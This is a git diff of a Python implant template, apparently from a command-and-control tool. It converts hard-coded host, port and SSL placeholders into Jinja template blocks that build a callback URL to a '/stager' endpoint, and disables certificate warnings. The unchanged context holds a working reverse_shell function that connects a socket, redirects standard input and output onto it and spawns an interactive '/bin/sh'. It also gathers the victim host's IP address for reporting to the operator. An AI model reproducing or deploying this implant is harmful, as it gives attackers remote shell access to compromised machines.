@@ -1,19 +1,18 @@
+import multiprocessing
+import os
+import socket
 import subprocess as sp
 import time
-import multiprocessing
+
 import requests as r
 import urllib3
-import socket
-import os
 
-HOST = host_replace
-PORT = port_replace
-SSL = ssl_replace
-if SSL:
-    URL = f"https://{HOST}:{PORT}"
-else:
-    URL = f"http://{HOST}:{PORT}"
+{% if ssl %}
+URL = "https://{{host}}:{{port}}/stager"
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+{% else %}
+URL = "http://{{host}}:{{port}}/stager"
+{% endif %}
 
 def reverse_shell(address: str, port: int):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -25,7 +24,6 @@ def reverse_shell(address: str, port: int):
     os.dup2(s.fileno(), 1)
     os.dup2(s.fileno(), 2)
     sp.call(["/bin/sh", "-i"])
-
 
 data = {
     "address": socket.gethostbyname(socket.gethostname()),
